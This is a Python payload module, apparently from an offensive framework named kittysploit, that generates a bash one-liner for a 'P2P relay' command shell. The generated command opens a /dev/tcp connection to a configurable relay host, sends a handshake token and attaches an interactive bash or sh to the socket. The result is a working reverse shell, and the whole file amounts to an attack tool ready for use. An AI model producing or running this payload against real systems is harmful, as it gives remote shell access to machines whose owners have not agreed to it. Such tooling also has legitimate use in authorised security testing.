#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *


class Module(Payload):

    __info__ = {
        "name": "Unix Command Shell, P2P Relay (via Bash)",
        "description": (
            "Connect to a P2P relay hub as AGENT (cleartext KSRL v1). "
            "For E2E encryption + PTY use payloads/singles/cmd/unix/python_p2p_relay."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/p2p_relay",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    relay_host = OptString("127.0.0.1", "Relay hub IP or hostname", True)
    relay_port = OptPort(9000, "Relay hub port", True)
    relay_token = OptString("kitty-room", "Shared room token (must match operator)", True)
    shell_binary = OptChoice(
        "bash",
        "System shell",
        True,
        choices=["bash", "sh"],
    )

    def generate(self):
        host = str(self.relay_host).replace("'", "'\"'\"'")
        port = int(self.relay_port)
        token = str(self.relay_token).replace("'", "'\"'\"'")
        shell = "/bin/bash" if self.shell_binary == "bash" else "/bin/sh"
        flag = "-i" if self.shell_binary == "bash" else ""

        payload = (
            f"bash -c 'exec 3<>/dev/tcp/{host}/{port}; "
            f'printf "KSRL:v1:AGENT:{token}\\n" >&3; '
            f"read -r _r <&3; "
            f'[[ \"$_r\" == KSRL:OK* ]] || exit 1; '
            f"exec 0<&3 1>&3 2>&3 {shell} {flag}'"
        )
        return payload
